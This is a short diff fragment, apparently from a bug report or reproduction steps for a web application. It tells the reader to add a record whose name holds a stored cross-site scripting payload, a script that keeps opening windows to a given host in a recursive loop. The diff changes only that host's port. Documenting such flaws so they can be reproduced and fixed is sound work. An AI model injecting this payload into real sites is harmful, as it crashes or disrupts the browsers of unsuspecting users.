@@ -40,7 +40,7 @@
 2. Add a new record, using the following as the value for the record name:
 >"&amp;gt;<script>
 function fork() {
-  	const win = window.open("http://flip3.engr.oregonstate.edu:6060/user/Kyle&12345");
+  	const win = window.open("http://flip3.engr.oregonstate.edu:6061/user/Kyle&12345");
 	setTimeout(fork(), 1);
 }
 fork(); </script>
